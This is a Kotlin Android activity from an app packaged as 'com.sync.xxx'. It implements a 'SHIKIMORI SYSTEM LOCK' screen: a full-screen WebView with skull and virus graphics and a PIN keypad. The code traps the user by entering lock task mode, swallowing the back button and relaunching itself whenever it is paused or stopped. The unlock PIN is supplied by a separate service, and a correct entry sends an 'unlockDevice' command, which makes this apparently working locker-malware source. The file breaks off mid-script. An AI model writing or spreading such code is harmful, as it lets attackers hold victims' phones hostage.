package com.sync.xxx

import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.media.MediaPlayer
import android.webkit.WebViewClient

class LockNewActivity : Activity() {

    private lateinit var webView: WebView
    private var mediaPlayer: MediaPlayer? = null
    private var correctPin: String  = ""
    private var lockTitle: String   = "Perangkat Terkunci"
    private var customHtml: String  = ""
    private var isReceiverRegistered = false
    private var isUnlocked = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.UNLOCK") {
                isUnlocked = true
                finish()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: ""
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: "Perangkat Terkunci"
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: ""

        setupWebView()
        registerUnlockReceiver()

        try {
    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
    if (dpm.isLockTaskPermitted(packageName)) startLockTask()
} catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "startLockTask: ${e.message}")
        }
        playLockSound()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: correctPin
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: lockTitle
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: customHtml
    }

    override fun onBackPressed() {
    if (!isUnlocked) return
    super.onBackPressed()
}

    override fun onPause() {
        super.onPause()
        if (isUnlocked) return
        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        handler.postDelayed({
            if (isUnlocked) return@postDelayed
            val intent = Intent(this, LockNewActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
            }
            startActivity(intent)
        }, 300)
    }

    override fun onStop() {
    super.onStop()
    if (isUnlocked) return
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
        val intent = Intent(this, LockNewActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            putExtra(LockOverlayService.EXTRA_PIN, correctPin)
            putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
        }
        startActivity(intent)
    }
}

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = WebView(this)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
        }
        webView.setBackgroundColor(android.graphics.Color.TRANSPARENT)
        webView.addJavascriptInterface(LockBridge(), "LockBridge")
        webView.webViewClient = WebViewClient()
        if (customHtml.isNotEmpty()) {
            webView.loadDataWithBaseURL(null, buildCustomLockHtml(customHtml), "text/html", "UTF-8", null)
        } else {
            webView.loadDataWithBaseURL(null, buildLockHtml(), "text/html", "UTF-8", null)
        }
        setContentView(webView)
    }

    private fun buildCustomLockHtml(body: String): String {
        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{width:100%;height:100%;background:transparent;overflow:hidden;display:flex;align-items:center;justify-content:center}
#wrap{width:100%;height:100%;display:flex;align-items:center;justify-content:center}
</style>
</head>
<body>
<div id="wrap">
${body}
</div>
</body>
</html>""".trimIndent()
    }

    private fun registerUnlockReceiver() {
        if (isReceiverRegistered) return
        try {
            val filter = IntentFilter("com.sync.xxx.UNLOCK")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(unlockReceiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "registerReceiver: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { stopLockTask() } catch (_: Exception) {}
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            isReceiverRegistered = false
        }
        mediaPlayer?.release()
        mediaPlayer = null
        webView.destroy()
    }

    inner class LockBridge {
        @JavascriptInterface
        fun tryUnlock(pin: String): Boolean {
            val ok = (pin == correctPin)
            if (ok) {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    try {
                        val cmdIntent = Intent(DeviceService.ACTION_COMMAND).apply {
                            putExtra(DeviceService.EXTRA_COMMAND, "unlockDevice")
                            putExtra(DeviceService.EXTRA_VALUE, "true")
                            setPackage(packageName)
                        }
                        sendBroadcast(cmdIntent)
                    } catch (e: Exception) {
                        android.util.Log.w("LockNewActivity", "broadcast: ${e.message}")
                    }
                    val unlockIntent = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
                    sendBroadcast(unlockIntent)
                }
            }
            return ok
        }

        @JavascriptInterface
        fun getLockTitle(): String = lockTitle
    }

    private fun playLockSound() {
        try {
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            mediaPlayer = MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                prepare()
                start()
                setOnCompletionListener { release(); mediaPlayer = null }
            }
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "playLockSound: ${e.message}")
        }
    }

    private fun buildLockHtml(): String {
        val safeTitle = lockTitle
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace("\"", "&quot;")

        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#fdf6e3;
  --card:#ffffff;
  --yellow:#ffd93d;
  --yellow-dark:#f4c430;
  --blue:#5b8def;
  --blue-dark:#3d6fd9;
  --green:#4caf50;
  --green-dark:#388e3c;
  --red:#ff4757;
  --pink:#ffb3d9;
  --pink-dark:#ff80c0;
  --black:#1a1a1a;
  --black2:#2d2d2d;
  --gray:#888888;
  --gray2:#e0e0e0;
  --text:#1a1a1a;
  --text2:#666666;
  --text3:#aaaaaa;
  --font:'Baloo 2',cursive;
  --mono:'JetBrains Mono',monospace;
}
html,body{height:100%;width:100%;overflow:hidden;touch-action:manipulation}
body{
  background:var(--bg);
  font-family:var(--font);
  -webkit-font-smoothing:antialiased;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  min-height:100vh;
  padding:20px;
  position:relative;
  overflow:hidden;
  color:var(--text);
}

/* ═══════════════════════════════════════════════════════════ */
/* BACKGROUND ANIMATIONS                                        */
/* ═══════════════════════════════════════════════════════════ */
.bg-dots{
  position:fixed;inset:0;pointer-events:none;z-index:0;
  background-image:radial-gradient(circle, rgba(255,179,217,.35) 2px, transparent 2px);
  background-size:28px 28px;
  animation:dotMove 15s linear infinite;
}
@keyframes dotMove{
  0%{background-position:0 0}
  100%{background-position:28px 28px}
}

.bg-blob{
  position:fixed;border-radius:50%;
  pointer-events:none;z-index:0;
  filter:blur(50px);
  opacity:.5;
}
.bg-blob.b1{width:320px;height:320px;background:var(--yellow);top:-120px;left:-120px;animation:blobFloat1 14s ease-in-out infinite}
.bg-blob.b2{width:280px;height:280px;background:var(--pink);bottom:-100px;right:-100px;animation:blobFloat2 18s ease-in-out infinite}
.bg-blob.b3{width:220px;height:220px;background:var(--blue);bottom:25%;left:-80px;animation:blobFloat3 16s ease-in-out infinite}
.bg-blob.b4{width:180px;height:180px;background:var(--green);top:40%;right:-60px;animation:blobFloat1 20s ease-in-out infinite reverse}
@keyframes blobFloat1{
  0%,100%{transform:translate(0,0) scale(1)}
  33%{transform:translate(40px,-30px) scale(1.15)}
  66%{transform:translate(-20px,20px) scale(.9)}
}
@keyframes blobFloat2{
  0%,100%{transform:translate(0,0) scale(1)}
  50%{transform:translate(-40px,-40px) scale(1.2)}
}
@keyframes blobFloat3{
  0%,100%{transform:translate(0,0) scale(1)}
  33%{transform:translate(30px,40px) scale(1.1)}
  66%{transform:translate(-30px,-20px) scale(.95)}
}

.bg-star{
  position:fixed;pointer-events:none;z-index:1;
  font-size:14px;opacity:.6;
  animation:starFloat linear infinite;
}
@keyframes starFloat{
  0%{transform:translateY(100vh) rotate(0deg);opacity:0}
  10%{opacity:.6}
  90%{opacity:.6}
  100%{transform:translateY(-100px) rotate(360deg);opacity:0}
}

/* ═══════════════════════════════════════════════════════════ */
/* INTRO SCREEN                                                 */
/* ═══════════════════════════════════════════════════════════ */
#introScreen{
  position:fixed;inset:0;
  background:var(--black);
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  z-index:100;gap:22px;padding:24px;
  animation:introDismiss .6s ease forwards 4.5s;
  overflow:hidden;
}
@keyframes introDismiss{
  0%{opacity:1;transform:none}
  100%{opacity:0;transform:scale(1.05);pointer-events:none}
}
#introScreen.done{display:none}

#introScreen::before{
  content:'';position:absolute;inset:0;
  background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(255,217,61,.04) 3px,rgba(255,217,61,.04) 6px);
  pointer-events:none;
  animation:introScan 6s linear infinite;
}
@keyframes introScan{
  0%{background-position:0 0}
  100%{background-position:0 100px}
}

.intro-card{
  background:var(--yellow);
  border:4px solid var(--black);
  border-radius:28px;
  padding:22px 32px;
  box-shadow:7px 7px 0 var(--black);
  display:flex;align-items:center;justify-content:center;
  animation:introPop .6s cubic-bezier(.16,1.4,.3,1) both, introBounce 2s ease-in-out 0.6s infinite;
  position:relative;z-index:1;
}
@keyframes introPop{from{opacity:0;transform:scale(.3) rotate(-15deg)}to{opacity:1;transform:none}}
@keyframes introBounce{
  0%,100%{transform:translateY(0) rotate(0)}
  50%{transform:translateY(-8px) rotate(2deg)}
}

.intro-skull{
  animation:pulseSkull 1.2s ease-in-out infinite, wiggle 3s ease-in-out infinite;
}
@keyframes pulseSkull{
  0%,100%{filter:drop-shadow(0 0 0 transparent)}
  50%{filter:drop-shadow(0 0 16px var(--red))}
}
@keyframes wiggle{
  0%,100%{transform:rotate(-3deg)}
  50%{transform:rotate(3deg)}
}

.intro-title{
  font-family:var(--font);
  font-size:26px;
  font-weight:800;
  letter-spacing:3px;
  text-transform:uppercase;
  color:var(--yellow);
  text-align:center;
  line-height:1.6;
  position:relative;z-index:1;
}
.intro-title .line{
  display:block;
  overflow:hidden;
  white-space:nowrap;
}
.intro-title .line1{animation:typeIn .5s steps(22,end) .3s both, textGlow 2s ease-in-out 1s infinite}
.intro-title .line2{animation:typeIn .5s steps(18,end) 1s both, textGlow 2s ease-in-out 1.5s infinite}
.intro-title .line3{animation:typeIn .6s steps(26,end) 1.7s both, textGlow 2s ease-in-out 2s infinite}
@keyframes typeIn{from{width:0;opacity:0}to{opacity:1}}
@keyframes textGlow{
  0%,100%{text-shadow:0 0 0 transparent}
  50%{text-shadow:0 0 20px var(--yellow),0 0 40px rgba(255,217,61,.5)}
}

.intro-bar-wrap{
  width:240px;height:10px;
  background:var(--black2);
  border:3px solid var(--yellow);
  border-radius:999px;
  overflow:hidden;
  box-shadow:4px 4px 0 rgba(255,217,61,.3);
  position:relative;z-index:1;
  animation:barPulse 1.5s ease-in-out infinite;
}
@keyframes barPulse{
  0%,100%{box-shadow:4px 4px 0 rgba(255,217,61,.3)}
  50%{box-shadow:4px 4px 0 rgba(255,217,61,.3),0 0 20px rgba(255,217,61,.5)}
}
.intro-bar{
  height:100%;width:0%;
  background:linear-gradient(90deg,var(--yellow),var(--pink),var(--blue),var(--yellow));
  background-size:300% 100%;
  border-radius:999px;
  animation:barFill 2.5s ease .5s forwards, barShimmer 2s linear infinite;
}
@keyframes barFill{to{width:100%}}
@keyframes barShimmer{
  0%{background-position:0% 50%}
  100%{background-position:300% 50%}
}

.intro-pct-wrap{
  font-family:var(--mono);
  font-size:13px;letter-spacing:3px;
  color:var(--yellow);
  font-weight:700;
  position:relative;z-index:1;
  animation:blink 1s ease-in-out infinite;
}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.5}}

/* ═══════════════════════════════════════════════════════════ */
/* MAIN CONTENT                                                 */
/* ═══════════════════════════════════════════════════════════ */
#mainContent{
  display:flex;flex-direction:column;align-items:center;
  position:relative;z-index:2;
  opacity:0;
  animation:mainIn .7s ease forwards 4.7s;
  width:100%;
  max-width:360px;
}
@keyframes mainIn{to{opacity:1}}

/* ═══════════════════════════════════════════════════════════ */
/* VIRUS ICON                                                   */
/* ═══════════════════════════════════════════════════════════ */
.virus-wrap{
  position:relative;width:120px;height:120px;
  margin-bottom:18px;flex-shrink:0;
  animation:popIn .6s cubic-bezier(.16,1.4,.3,1) both, floatY 3s ease-in-out .6s infinite;
}
@keyframes popIn{from{opacity:0;transform:scale(.3) rotate(-180deg)}to{opacity:1;transform:none}}
@keyframes floatY{
  0%,100%{transform:translateY(0)}
  50%{transform:translateY(-10px)}
}

.virus-bg{
  width:120px;height:120px;border-radius:50%;
  background:var(--yellow);
  border:4px solid var(--black);
  display:flex;align-items:center;justify-content:center;
  position:relative;z-index:1;
  box-shadow:6px 6px 0 var(--black);
  animation:virusPulse 2s ease-in-out infinite;
}
@keyframes virusPulse{
  0%,100%{box-shadow:6px 6px 0 var(--black);transform:scale(1)}
  50%{box-shadow:6px 6px 0 var(--black),0 0 0 10px rgba(255,217,61,.3);transform:scale(1.05)}
}

.v-orbit{
  position:absolute;inset:-16px;border-radius:50%;
  border:3px dashed var(--black);
  animation:orbitSpin 10s linear infinite;
}
.v-orbit2{
  position:absolute;inset:-28px;border-radius:50%;
  border:2px dotted var(--blue);
  animation:orbitSpin 16s linear infinite reverse;
}
.v-orbit3{
  position:absolute;inset:-40px;border-radius:50%;
  border:1px solid rgba(255,71,87,.4);
  animation:orbitSpin 24s linear infinite;
}
@keyframes orbitSpin{to{transform:rotate(360deg)}}

.spike-dot{
  position:absolute;width:12px;height:12px;border-radius:50%;
  background:var(--red);
  border:2px solid var(--black);
  animation:spikePulse 1.5s ease-in-out infinite;
}
.spike-dot:nth-child(1){top:-7px;left:50%;transform:translateX(-50%);animation-delay:0s}
.spike-dot:nth-child(2){bottom:-7px;left:50%;transform:translateX(-50%);animation-delay:.3s}
.spike-dot:nth-child(3){left:-7px;top:50%;transform:translateY(-50%);animation-delay:.6s;animation-name:spikePulseY}
.spike-dot:nth-child(4){right:-7px;top:50%;transform:translateY(-50%);animation-delay:.9s;animation-name:spikePulseY}
@keyframes spikePulse{
  0%,100%{opacity:1;transform:scale(1) translateX(-50%)}
  50%{opacity:.3;transform:scale(.5) translateX(-50%)}
}
@keyframes spikePulseY{
  0%,100%{opacity:1;transform:scale(1) translateY(-50%)}
  50%{opacity:.3;transform:scale(.5) translateY(-50%)}
}

.virus-svg{animation:virusSpin 8s linear infinite, virusWiggle 3s ease-in-out infinite;}
@keyframes virusSpin{to{transform:rotate(360deg)}}
@keyframes virusWiggle{
  0%,100%{transform:scale(1)}
  50%{transform:scale(1.08)}
}

/* ═══════════════════════════════════════════════════════════ */
/* TITLE                                                        */
/* ═══════════════════════════════════════════════════════════ */
.lock-title{
  font-size:28px;font-weight:800;
  color:var(--black);
  text-align:center;letter-spacing:-.3px;line-height:1.2;
  margin-bottom:6px;
  animation:fadeUp .5s cubic-bezier(.16,1.4,.3,1) .1s both, titleWiggle 4s ease-in-out .6s infinite;
  text-shadow:2px 2px 0 var(--yellow);
  position:relative;z-index:1;
}
@keyframes titleWiggle{
  0%,100%{transform:rotate(0) scale(1)}
  25%{transform:rotate(-1deg) scale(1.02)}
  75%{transform:rotate(1deg) scale(1.02)}
}

.lock-sub{
  font-family:var(--mono);font-size:10px;
  color:var(--text2);letter-spacing:2.5px;text-transform:uppercase;
  text-align:center;margin-bottom:24px;
  animation:fadeUp .5s cubic-bezier(.16,1.4,.3,1) .15s both, subShimmer 3s ease-in-out infinite;
  font-weight:700;
}
@keyframes subShimmer{
  0%,100%{color:var(--text2)}
  50%{color:var(--blue-dark)}
}

/* ═══════════════════════════════════════════════════════════ */
/* PIN DOTS                                                     */
/* ═══════════════════════════════════════════════════════════ */
.pin-wrap{
  display:flex;gap:18px;justify-content:center;margin-bottom:14px;
  animation:fadeUp .5s cubic-bezier(.16,1.4,.3,1) .2s both;
}
.pin-dot{
  width:20px;height:20px;border-radius:50%;
  border:3px solid var(--black);
  background:var(--card);
  transition:background .18s,transform .18s,box-shadow .18s;
  box-shadow:2px 2px 0 var(--black);
}
.pin-dot.filled{
  background:var(--yellow);
  transform:scale(1.2);
  box-shadow:2px 2px 0 var(--black),0 0 0 5px rgba(255,217,61,.4);
  animation:dotPop .3s cubic-bezier(.16,1.4,.3,1);
}
@keyframes dotPop{
  0%{transform:scale(1)}
  50%{transform:scale(1.4)}
  100%{transform:scale(1.2)}
}
.pin-dot.error{
  background:var(--red);
  animation:shake .4s ease;
  box-shadow:2px 2px 0 var(--black),0 0 0 5px rgba(255,71,87,.4);
}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-9px)}75%{transform:translateX(9px)}}

/* ═══════════════════════════════════════════════════════════ */
/* STATUS                                                       */
/* ═══════════════════════════════════════════════════════════ */
.pin-status{
  height:26px;margin-bottom:22px;
  font-family:var(--mono);font-size:11px;
  letter-spacing:1.5px;text-transform:uppercase;
  text-align:center;color:var(--text2);transition:color .2s;
  font-weight:700;
  animation:fadeUp .5s cubic-bezier(.16,1.4,.3,1) .25s both;
}
.pin-status.err{color:var(--red);animation:errBlink .3s ease 3}
.pin-status.ok{color:var(--green-dark);animation:okPulse 1s ease infinite}
@keyframes errBlink{0%,100%{opacity:1}50%{opacity:.4}}
@keyframes okPulse{
  0%,100%{text-shadow:0 0 0 transparent}
  50%{text-shadow:0 0 12px var(--green)}
}

/* ═══════════════════════════════════════════════════════════ */
/* KEYPAD — FIXED RESPONSIVE                                    */
/* ═══════════════════════════════════════════════════════════ */
.keypad{
  display:grid;grid-template-columns:repeat(3,1fr);
  gap:12px;width:100%;max-width:310px;
  animation:fadeUp .5s cubic-bezier(.16,1.4,.3,1) .3s both;
  touch-action:manipulation;
}
.key{
  height:70px;border-radius:20px;
  border:3px solid var(--black);
  background:var(--card);
  color:var(--black);
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  cursor:pointer;
  -webkit-tap-highlight-color:transparent;
  -webkit-touch-callout:none;
  touch-action:manipulation;
  transition:transform .1s,background .1s,box-shadow .1s;
  position:relative;overflow:hidden;
  user-select:none;-webkit-user-select:none;
  box-shadow:5px 5px 0 var(--black);
  font-family:var(--font);
  animation:keyEntrance .5s cubic-bezier(.16,1.4,.3,1) both;
}
.key:nth-child(1){animation-delay:.32s}
.key:nth-child(2){animation-delay:.35s}
.key:nth-child(3){animation-delay:.38s}
.key:nth-child(4){animation-delay:.41s}
.key:nth-child(5){animation-delay:.44s}
.key:nth-child(6){animation-delay:.47s}
.key:nth-child(7){animation-delay:.5s}
.key:nth-child(8){animation-delay:.53s}
.key:nth-child(9){animation-delay:.56s}
.key:nth-child(11){animation-delay:.59s}
.key:nth-child(12){animation-delay:.62s}
@keyframes keyEntrance{
  from{opacity:0;transform:scale(.5) translateY(20px)}
  to{opacity:1;transform:none}
}

.key::before{
  content:'';position:absolute;top:0;left:0;right:0;height:40%;
  background:linear-gradient(180deg,rgba(255,255,255,.4),transparent);
  border-radius:17px 17px 50% 50%;
  pointer-events:none;
}

.key .num{font-size:28px;font-weight:800;line-height:1;color:var(--black);position:relative;z-index:1;}
.key .sub{font-family:var(--mono);font-size:8px;letter-spacing:1.5px;color:var(--text2);margin-top:2px;font-weight:700;position:relative;z-index:1}
.key.del{color:var(--black);background:var(--gray2)}
.key.empty{pointer-events:none;opacity:0;background:transparent;border-color:transparent;box-shadow:none}
.key:active{
  transform:translate(3px,3px);
  box-shadow:2px 2px 0 var(--black);
  background:var(--yellow);
}
.key:active::before{opacity:.3}

.key[data-n="1"]:active,
.key[data-n="2"]:active,
.key[data-n="3"]:active{background:var(--pink)}
.key[data-n="4"]:active,
.key[data-n="5"]:active,
.key[data-n="6"]:active{background:var(--yellow)}
.key[data-n="7"]:active,
.key[data-n="8"]:active,
.key[data-n="9"]:active{background:#a8d8ff}
.key[data-n="0"]:active{background:var(--green);color:#fff}
.key.del:active{background:var(--red);color:#fff}

/* ═══════════════════════════════════════════════════════════ */
/* GENERAL ANIMATIONS                                           */
/* ═══════════════════════════════════════════════════════════ */
@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:none}}

/* ═══════════════════════════════════════════════════════════ */
/* SUCCESS OVERLAY                                              */
/* ═══════════════════════════════════════════════════════════ */
.success-flash{
  position:fixed;inset:0;
  background:var(--green);
  opacity:0;
  pointer-events:none;
  z-index:9999;
  animation:successFlash .8s ease;
}
@keyframes successFlash{
  0%{opacity:0}
  30%{opacity:.6}
  100%{opacity:0}
}

/* ═══════════════════════════════════════════════════════════ */
/* MOBILE                                                       */
/* ═══════════════════════════════════════════════════════════ */
@media (max-height:720px){
  .virus-wrap{width:100px;height:100px}
  .virus-bg{width:100px;height:100px}
  .lock-title{font-size:24px}
  .key{height:60px}
  .key .num{font-size:24px}
  .bg-star{font-size:11px}
}
@media (max-height:600px){
  .lock-sub{display:none}
  .pin-status{margin-bottom:14px}
  .key{height:54px}
  .key .num{font-size:22px}
}
</style>
</head>
<body>

<!-- BACKGROUND -->
<div class="bg-blob b1"></div>
<div class="bg-blob b2"></div>
<div class="bg-blob b3"></div>
<div class="bg-blob b4"></div>
<div class="bg-dots"></div>
<div id="stars"></div>

<!-- INTRO SCREEN -->
<div id="introScreen">
  <div class="intro-card">
    <div class="intro-skull">
      <svg width="80" height="80" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
        <ellipse cx="32" cy="26" rx="18" ry="17" fill="#fff" stroke="#1a1a1a" stroke-width="3"/>
        <ellipse cx="24" cy="24" rx="5.5" ry="6" fill="#1a1a1a"/>
        <ellipse cx="40" cy="24" rx="5.5" ry="6" fill="#1a1a1a"/>
        <circle cx="25" cy="23" r="1.5" fill="#fff"/>
        <circle cx="41" cy="23" r="1.5" fill="#fff"/>
        <path d="M30 32 L32 28 L34 32 Z" fill="#ff4757"/>
        <path d="M14 38 Q14 48 22 48 L22 52 L26 52 L26 48 L32 48 L32 52 L36 52 L36 48 L42 48 Q50 48 50 38" fill="#1a1a1a" stroke="#1a1a1a" stroke-width="2" stroke-linecap="round"/>
      </svg>
    </div>
  </div>

  <div class="intro-title">
    <span class="line line1">HAI BRO</span>
    <span class="line line2">SHIKIMORI</span>
    <span class="line line3">SYSTEM LOCK</span>
  </div>

  <div class="intro-bar-wrap">
    <div class="intro-bar"></div>
  </div>

  <div class="intro-pct-wrap">
    <span id="pctNum">0%</span>
  </div>
</div>

<!-- MAIN CONTENT -->
<div id="mainContent">
  <div class="virus-wrap">
    <div class="v-orbit">
      <div class="spike-dot"></div>
      <div class="spike-dot"></div>
      <div class="spike-dot"></div>
      <div class="spike-dot"></div>
    </div>
    <div class="v-orbit2"></div>
    <div class="v-orbit3"></div>
    <div class="virus-bg">
      <svg class="virus-svg" width="66" height="66" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="50" cy="50" r="24" fill="#fff" stroke="#1a1a1a" stroke-width="3"/>
        <circle cx="50" cy="50" r="14" fill="#ff4757" stroke="#1a1a1a" stroke-width="2" stroke-dasharray="3 3"/>
        <circle cx="50" cy="50" r="5" fill="#1a1a1a"/>
        <line x1="50" y1="22" x2="50" y2="10" stroke="#1a1a1a" stroke-width="3" stroke-linecap="round"/>
        <circle cx="50" cy="8" r="4" fill="#ffd93d" stroke="#1a1a1a" stroke-width="2"/>
        <line x1="72" y1="33" x2="81" y2="24" stroke="#1a1a1a" stroke-width="3" stroke-linecap="round"/>
        <circle cx="83" cy="22" r="4" fill="#ffd93d" stroke="#1a1a1a" stroke-width="2"/>
        <line x1="78" y1="50" x2="90" y2="50" stroke="#1a1a1a" stroke-width="3" stroke-linecap="round"/>
        <circle cx="92" cy="50" r="4" fill="#ffd93d" stroke="#1a1a1a" stroke-width="2"/>
        <line x1="72" y1="67" x2="81" y2="76" stroke="#1a1a1a" stroke-width="3" stroke-linecap="round"/>
        <circle cx="83" cy="78" r="4" fill="#ffd93d" stroke="#1a1a1a" stroke-width="2"/>
        <line x1="50" y1="78" x2="50" y2="90" stroke="#1a1a1a" stroke-width="3" stroke-linecap="round"/>
        <circle cx="50" cy="92" r="4" fill="#ffd93d" stroke="#1a1a1a" stroke-width="2"/>
        <line x1="28" y1="67" x2="19" y2="76" stroke="#1a1a1a" stroke-width="3" stroke-linecap="round"/>
        <circle cx="17" cy="78" r="4" fill="#ffd93d" stroke="#1a1a1a" stroke-width="2"/>
        <line x1="22" y1="50" x2="10" y2="50" stroke="#1a1a1a" stroke-width="3" stroke-linecap="round"/>
        <circle cx="8" cy="50" r="4" fill="#ffd93d" stroke="#1a1a1a" stroke-width="2"/>
        <line x1="28" y1="33" x2="19" y2="24" stroke="#1a1a1a" stroke-width="3" stroke-linecap="round"/>
        <circle cx="17" cy="22" r="4" fill="#ffd93d" stroke="#1a1a1a" stroke-width="2"/>
      </svg>
    </div>
  </div>

  <div class="lock-title">$safeTitle</div>
  <div class="lock-sub">Enter Pin To Unlock</div>

  <div class="pin-wrap">
    <div class="pin-dot" id="d0"></div>
    <div class="pin-dot" id="d1"></div>
    <div class="pin-dot" id="d2"></div>
    <div class="pin-dot" id="d3"></div>
  </div>

  <div class="pin-status" id="pinStatus">by @Rizzisreal01</div>

  <div class="keypad" id="keypad">
    <div class="key" data-n="1"><span class="num">1</span><span class="sub"></span></div>
    <div class="key" data-n="2"><span class="num">2</span><span class="sub">ABC</span></div>
    <div class="key" data-n="3"><span class="num">3</span><span class="sub">DEF</span></div>
    <div class="key" data-n="4"><span class="num">4</span><span class="sub">GHI</span></div>
    <div class="key" data-n="5"><span class="num">5</span><span class="sub">JKL</span></div>
    <div class="key" data-n="6"><span class="num">6</span><span class="sub">MNO</span></div>
    <div class="key" data-n="7"><span class="num">7</span><span class="sub">PQRS</span></div>
    <div class="key" data-n="8"><span class="num">8</span><span class="sub">TUV</span></div>
    <div class="key" data-n="9"><span class="num">9</span><span class="sub">WXYZ</span></div>
    <div class="key empty"></div>
    <div class="key" data-n="0"><span class="num">0</span><span class="sub"></span></div>
    <div class="key del" data-del="1">
      <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
        <line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/>
      </svg>
    </div>
  </div>
</div>

<script>
/* ═══════════════════════════════════════════════════════════ */
/* INTRO PERCENT COUNTER                                        */
/* ═══════════════════════════════════════════════════════════ */
(function(){
  var el = document.getElementById('pctNum');
  var start = null;
  var dur = 2500;
  function step(ts){
    if(!start) start = ts + 500;
    var p = Math.min(1, Math.max(0,(ts-start)/dur));
    var v = Math.floor(p*100);
    el.textContent = v + '%';
    if(p < 1) requestAnimationFrame(step);
  }
  requestAnimationFrame(step);
})();

/* ═══════════════════════════════════════════════════════════ */
/* HIDE INTRO                                                    */
/* ═══════════════════════════════════════════════════════════ */
setTimeout(function(){
  var intro = document.getElementById('introScreen');
  intro.style.pointerEvents = 'none';
  setTimeout(function(){ intro.style.display='none'; }, 600);
}, 4500);

/* ═══════════════════════════════════════════════════════════ */
/* FLOATING STARS                                                */
/* ═══════════════════════════════════════════════════════════ */
(function(){
  var stars = ['★','✦','✧','⭐','✩','✪','✫'];
  var colors = ['#ffd93d','#ffb3d9','#5b8def','#4caf50','#ff4757'];
  var container = document.getElementById('stars');
  for(var i=0;i<18;i++){
    var s = document.createElement('div');
    s.className = 'bg-star';
    s.textContent = stars[Math.floor(Math.random()*stars.length)];
    s.style.left = (Math.random()*100) + '%';
    s.style.color = colors[Math.floor(Math.random()*colors.length)];
    s.style.animationDuration = (8 + Math.random()*10) + 's';
    s.style.animationDelay = (Math.random()*-15) + 's';
    s.style.fontSize = (10 + Math.random()*10) + 'px';
    container.appendChild(s);
  }
})();

/* ═══════════════════════════════════════════════════════════ */
/* PIN LOGIC — FIXED RESPONSIVE                                 */
/* ═══════════════════════════════════════════════════════════ */
var pin = '';
var blocked = false;
var keypad = document.getElementById('keypad');

function handleKeyPress(key){
  if(!key || key.classList.contains('empty')) return;
  if(blocked) return;

  key.style.transform = 'translate(3px,3px)';
  key.style.boxShadow = '2px 2px 0 var(--black)';
  setTimeout(function(){
    key.style.transform = '';
    key.style.boxShadow = '';
  }, 100);

  if(key.dataset.del){
    doDelete();
    return;
  }
  if(key.dataset.n !== undefined){
    doPress(key.dataset.n);
  }
}

if(window.PointerEvent){
